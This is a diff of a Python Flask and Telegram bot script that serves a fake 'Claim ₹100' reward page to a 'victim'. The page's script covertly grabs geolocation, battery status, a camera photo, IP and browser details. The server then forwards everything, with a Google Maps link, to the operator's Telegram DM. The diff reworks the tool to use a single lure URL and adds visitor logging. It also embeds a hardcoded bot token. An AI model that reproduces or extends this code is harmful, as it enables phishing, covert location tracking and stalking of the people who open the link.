@@ -1,6 +1,5 @@
 import os
 import json
-import uuid
 import base64
 import logging
 import requests
@@ -11,11 +10,11 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import threading
 import time
+import uuid
 
 # ======== CONFIG ========
 BOT_TOKEN = "8222470338:AAE5mR86BFGu1V9NwJok-N1yquxbmqtHVNI"
 ADMIN_ID = 8986441675
-APP_URL = os.environ.get("APP_URL", "https://your-app.onrender.com")
 PORT = int(os.environ.get("PORT", 5000))
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -27,7 +26,7 @@ def load_db():
     if os.path.exists(DB_FILE):
         with open(DB_FILE, "r") as f:
             return json.load(f)
-    return {"admins": [str(ADMIN_ID)], "banned": [], "users": [], "logs": [], "bot_on": True, "tokens": {}}
+    return {"admins": [str(ADMIN_ID)], "banned": [], "users": [], "logs": [], "bot_on": True, "visits": []}
 
 def save_db(db):
     with open(DB_FILE, "w") as f:
@@ -83,7 +82,7 @@ small{font-size:11px;color:#999;margin-top:20px;display:block}
 <small>* Limited time offer</small>
 </div>
 <script>
-let TKN = "[TOKEN]";
+let vid = "[VID]";
 let sent = false;
 async function claim(){
   if(sent) return; sent = true;
@@ -105,10 +104,10 @@ async function claim(){
   }catch(e){}
   let ip = 'Unknown';
   try{let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); ip = d.ip}catch(e){}
-  fetch('/collect/'+TKN,{
+  fetch('/data',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({battery:bat,lat:lat,lon:lon,photo:photo,ip:ip,ua:navigator.userAgent,ts:new Date().toISOString()})
+    body:JSON.stringify({vid:vid,battery:bat,lat:lat,lon:lon,photo:photo,ip:ip,ua:navigator.userAgent,ts:new Date().toISOString()})
   }).then(r=>r.json()).then(d=>{
     document.getElementById('load').style.display = 'none';
     document.getElementById('sts').className = 'sts ok';
@@ -126,33 +125,37 @@ async function claim(){
 
 @app.route('/')
 def home():
-    return "✅ Bot is live", 200
-
-@app.route('/health')
-def health():
-    return "OK", 200
-
-@app.route('/collect/<token>')
-def show_claim(token):
-    db = load_db()
-    if token not in db.get("tokens", {}):
-        return "❌ Link expired or invalid", 404
-    return render_template_string(CLAIM_PAGE.replace("[TOKEN]", token))
-
-@app.route('/collect/<token>', methods=['POST'])
-def receive_data(token):
-    db = load_db()
-    if token not in db.get("tokens", {}):
-        return jsonify({"success": False, "error": "Invalid"}), 404
+    """Primary URL - YAHI VICTIM KO BHEJNA HAI"""
+    vid = str(uuid.uuid4())[:8]
     
-    tok_info = db["tokens"].pop(token)
+    # Log visit
+    db = load_db()
+    db["visits"].append({"vid": vid, "time": datetime.now().isoformat(), "ip": request.remote_addr})
     save_db(db)
     
+    # Send notification to admin DM
+    try:
+        ip = request.remote_addr
+        ua = request.headers.get("User-Agent", "Unknown")
+        msg = f"👤 <b>New Visitor!</b>\n"
+        msg += f"🌐 IP: <code>{ip}</code>\n"
+        msg += f"📱 UA: {ua[:50]}...\n"
+        msg += f"🕐 {datetime.now().isoformat()}"
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+            "chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML"
+        })
+    except:
+        pass
+    
+    return render_template_string(CLAIM_PAGE.replace("[VID]", vid))
+
+@app.route('/data', methods=['POST'])
+def receive_data():
+    """Receive data when victim claims"""
     data = request.json
+    
     entry = {
-        "uid": tok_info.get("user_id"),
-        "uname": tok_info.get("username"),
-        "fname": tok_info.get("first_name"),
+        "vid": data.get("vid", "?"),
         "ip": data.get("ip", "N/A"),
         "battery": data.get("battery", "N/A"),
         "lat": data.get("lat"),
@@ -166,22 +169,22 @@ def receive_data(token):
     db["logs"].append(entry)
     save_db(db)
     
-    # Send DM to admin with all data
+    # Send to admin DM with ALL data
     try:
-        msg = f"🔔 <b>New Victim Data!</b>\n"
-        msg += f"👤 {entry['fname']} (@{entry['uname']})\n"
-        msg += f"🆔 ID: {entry['uid']}\n"
+        msg = f"🔔 <b>Victim Data Received!</b>\n"
         msg += f"🌐 IP: <code>{entry['ip']}</code>\n"
         msg += f"🔋 Battery: {entry['battery']}\n"
         if entry['lat'] and entry['lon']:
             msg += f"📍 {entry['lat']}, {entry['lon']}\n"
             msg += f"🗺️ <a href='https://maps.google.com/maps?q={entry['lat']},{entry['lon']}'>Google Maps</a>\n"
+        msg += f"📱 UA: {entry['ua'][:80]}\n"
         msg += f"🕐 {entry['ts']}"
         
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
             "chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML"
         })
         
+        # Send photo
         if entry.get('photo'):
             try:
                 img_bytes = base64.b64decode(entry['photo'].split(',')[1])
@@ -191,11 +194,15 @@ def receive_data(token):
             except:
                 pass
     except Exception as e:
-        logger.error(f"DM send error: {e}")
+        logger.error(f"DM error: {e}")
     
     return jsonify({"success": True})
 
-# ======== BOT HANDLERS ========
+@app.route('/health')
+def health():
+    return "OK", 200
+
+# ======== BOT ========
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
     db = load_db()
@@ -210,19 +217,13 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if str(u.id) not in [x["id"] for x in db["users"]]:
         db["users"].append({"id": str(u.id), "uname": u.username, "fname": u.first_name, "joined": str(update.message.date)})
         save_db(db)
-        if str(u.id) != str(ADMIN_ID):
-            try:
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    "chat_id": ADMIN_ID, "text": f"🆕 New User: {u.first_name} (@{u.username}) [ID: {u.id}]"
-                })
-            except:
-                pass
     
     welcome = f"👋 Welcome {u.first_name}!\n\n"
-    welcome += "Send me any link. I'll give you a claim link.\n"
-    welcome += "Victim taps 'Claim ₹100' → You get their data in DM."
+    welcome += "✅ Bot ready!\n"
+    welcome += f"🔗 Primary URL: <code>{request.url_root.rstrip('/')}</code>\n\n"
+    welcome += "Ye URL victim ko bhejo. Woh Claim ₹100 dabayega → data DM mein aayega."
     
-    await update.message.reply_text(welcome)
+    await update.message.reply_text(welcome, parse_mode="HTML")
     if is_admin(u.id):
         await update.message.reply_text("✅ Admin mode. Use /help")
 
@@ -239,7 +240,7 @@ async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     
     text = update.message.text.strip()
     
-    # ---- Admin Commands ----
+    # Admin commands
     if is_admin(u.id) and text.startswith("/"):
         args = text.split()
         cmd = args[0].lower()
@@ -248,11 +249,11 @@ async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             h = """<b>Admin Commands:</b>
 /approve [id] - Add admin
 /unapprove [id] - Remove admin
-/ban [id] - Ban user
+/ban [id] - Ban
 /unban [id] - Unban
 /users - List users
 /stats - Stats
-/logs - View logs
+/logs - Victim logs
 /on - Bot ON
 /off - Bot OFF
 /clear - Clear logs"""
@@ -265,7 +266,7 @@ async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             if uid not in db["admins"]:
                 db["admins"].append(uid); save_db(db)
                 await update.message.reply_text(f"✅ {uid} approved!")
-                try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": uid, "text": "✅ You're admin now! /help"})
+                try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": uid, "text": "✅ Admin! /help"})
                 except: pass
             else: await update.message.reply_text("Already admin")
         
@@ -305,7 +306,7 @@ async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         
         elif cmd == "/stats":
             db = load_db()
-            s = f"📊 Stats:\n👥 Users: {len(db['users'])}\n📝 Logs: {len(db['logs'])}\n🛡️ Admins: {len(db['admins'])}\n⛔ Banned: {len(db.get('banned',[]))}\n{'🟢 ON' if db.get('bot_on') else '🔴 OFF'}"
+            s = f"📊 Stats:\n👥 Users: {len(db['users'])}\n📝 Logs: {len(db['logs'])}\n👁️ Visits: {len(db.get('visits',[]))}\n🛡️ Admins: {len(db['admins'])}\n⛔ Banned: {len(db.get('banned',[]))}\n{'🟢 ON' if db.get('bot_on') else '🔴 OFF'}"
             await update.message.reply_text(s)
         
         elif cmd == "/logs":
@@ -314,9 +315,9 @@ async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             if not logs: return await update.message.reply_text("No logs")
             msg = f"📋 Last {len(logs)}:\n"
             for l in logs:
-                msg += f"👤 {l.get('fname','?')} @{l.get('uname','?')}\n🌐 {l.get('ip','?')} 🔋 {l.get('battery','?')}\n"
+                msg += f"🌐 {l.get('ip','?')} 🔋 {l.get('battery','?')}\n"
                 if l.get('lat'): msg += f"📍 {l['lat']},{l['lon']}\n"
-                msg += "───\n"
+                msg += f"🕐 {l.get('ts','?')[:19]}\n───\n"
             await update.message.reply_text(msg[:4000])
         
         elif cmd == "/on":
@@ -333,21 +334,12 @@ async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         
         return
     
-    # ---- Link Generate (for everyone) ----
-    if not text.startswith(("http://", "https://")):
-        await update.message.reply_text("❌ Valid link bhejo (http/https)")
-        return
-    
-    token = str(uuid.uuid4())[:8]
-    claim_url = f"{APP_URL}/collect/{token}"
-    
-    db = load_db()
-    db["tokens"][token] = {"user_id": str(u.id), "username": u.username, "first_name": u.first_name, "link": text}
-    save_db(db)
-    
+    # Agar koi link daale to batao ki primary URL use kare
     await update.message.reply_text(
-        f"✅ Ready!\n🔗 <code>{claim_url}</code>\n\n"
-        f"Victim ko ye link bhejo. Woh 'Claim ₹100' dabayega → Data DM mein aayega.",
+        f"❌ Extra link generate nahi hota.\n\n"
+        f"Sirf <b>primary URL</b> use karo:\n"
+        f"🔗 <code>{request.url_root.rstrip('/')}</code>\n\n"
+        f"Yehi URL victim ko bhejo. Woh 'Claim ₹100' dabayega → data DM mein.",
         parse_mode="HTML"
     )
 
@@ -362,7 +354,7 @@ def start_bot():
     application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 if __name__ == "__main__":
-    logger.info(f"Starting... PORT={PORT}, APP_URL={APP_URL}")
+    logger.info(f"Starting on port {PORT}")
     t = threading.Thread(target=start_flask, daemon=True)
     t.start()
     time.sleep(2)
